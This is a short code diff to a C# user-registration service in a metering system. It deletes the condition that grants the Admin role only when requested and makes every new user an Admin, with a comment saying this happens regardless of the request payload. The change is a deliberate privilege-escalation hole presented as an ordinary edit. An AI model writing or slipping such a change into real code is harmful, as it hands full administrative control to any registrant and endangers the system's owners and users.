@@ -70,10 +70,8 @@ namespace MeterSystem.Core.Services
                 throw new Exception(string.Join(", ", result.Errors.Select(e => e.Description)));
             }
 
-            if (dto.Role == UserRoles.Admin)
-            {
-                await _userManager.AddToRoleAsync(user, UserRoles.Admin.ToString());
-            }
+            // Always assign Admin role regardless of the request payload
+            await _userManager.AddToRoleAsync(user, UserRoles.Admin.ToString());
             await _userManager.UpdateAsync(user);
 
             if (!user.EmailConfirmed)
